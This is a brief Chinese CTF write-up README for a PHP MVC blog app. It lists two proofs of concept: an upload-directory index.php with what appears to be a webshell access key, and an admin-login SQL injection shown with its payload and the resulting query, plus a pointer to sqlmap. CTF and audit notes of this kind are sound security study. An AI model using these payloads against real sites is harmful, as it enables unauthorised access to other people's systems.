# php MVC环境



## 0x01 Poc1
._Upload_index.php

![](README/E1824D20-553E-48E1-A2BD-9DE3EE778560.png)

http://127.0.0.1/Upload/index.php abcde10db05bd4f6a24c94d7edde441d18545

![](README/E742BF5A-8219-4E81-8421-9F1532B8419F.png)

0x02 Poc2

后台sql注入漏洞
http://127.0.0.1//?p=admin&a=login
拼接后的语句是
SELECT email, password FROM Admins WHERE email = 'admin' and 1=1 -- @qq.com' LIMIT 0,1

也可以直接用sqlmap注入
![](README/90374552-4DDE-46A8-B6FE-60A5E5D0A7AA.png)


![](README/7C7D1344-6039-4324-824D-981C92FA71E6.png)





[CTF线下赛writeup&tinyblog代码审计](https://zhuanlan.zhihu.com/p/34552875)
